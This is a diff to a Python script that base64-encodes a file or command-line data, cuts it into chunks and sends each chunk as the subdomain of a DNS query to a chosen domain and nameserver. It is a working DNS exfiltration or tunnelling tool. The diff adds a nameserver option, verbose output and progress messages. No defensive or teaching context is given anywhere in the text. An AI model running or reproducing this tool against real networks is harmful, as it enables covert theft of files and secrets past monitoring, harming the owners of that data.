@@ -4,13 +4,15 @@ import os
 import base64
 import dns.resolver  # dnspython
 
+dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
+
 
 def valid_file(filename):
     print('Testing if %s is a file.' % filename)
     if not os.path.exists(filename):
         raise argparse.ArgumentTypeError('The file %s does not exist!' % filename)
     else:
-        print('Yes it is.')
+        print('Yes it is a file.')
         return filename
 
 
@@ -26,6 +28,10 @@ parser.add_argument('--data', type=str,
                     help='Read data from the command line. (default: none)')
 parser.add_argument('--type', '-t', type=str, choices=['A', 'TXT'], default='TXT',
                     help='Read data from the command line. (default: TXT)')
+parser.add_argument('--nameserver', '-n', '-ns', type=str, default='8.8.8.8',
+                    help='Nameserver to query. (default: 8.8.8.8)')
+parser.add_argument('--verbose', '-v', action="store_true",
+                    help='Verbose output. (default: none)')
 args = parser.parse_args()
 
 
@@ -37,6 +43,8 @@ def main():
         fulldata = '\n'.join(plaindata)
     elif args.data:
         fulldata = args.data
+    else:
+        exit('666, no data found.')
     if fulldata:
         encodeddata = base64.b64encode(fulldata.encode('ascii')).decode('ascii')
         encodeddata = encodeddata.replace('=', '')
@@ -46,14 +54,20 @@ def main():
 def sendqueries(b64data):
     blocksize = args.blocksize
     domain = args.domain
-    type=args.type
+    type = args.type
+    nameserver = args.nameserver
+    dns.resolver.default_resolver.nameservers = [nameserver]
     b64array = [b64data[y-blocksize:y] for y in range(blocksize, len(b64data)+blocksize, blocksize)]
-    print(len(b64array))
+    print('We are sending', len(b64array), 'queries to fit all the data.\n')
+    print('Using %s as our nameserver.\n' % nameserver)
+    counter = 1
     for word in b64array:
         queryname = word + '.' + domain
-        print('\nSending %s' % queryname)
+        print('Query %s %s %s' % (str(counter), queryname, type))
         result = dns.resolver.resolve(queryname, type)
-        print(str(result.response))
+        if args.verbose:
+            print(str(result.response))
+        counter += 1
 
 
 if __name__ == "__main__":
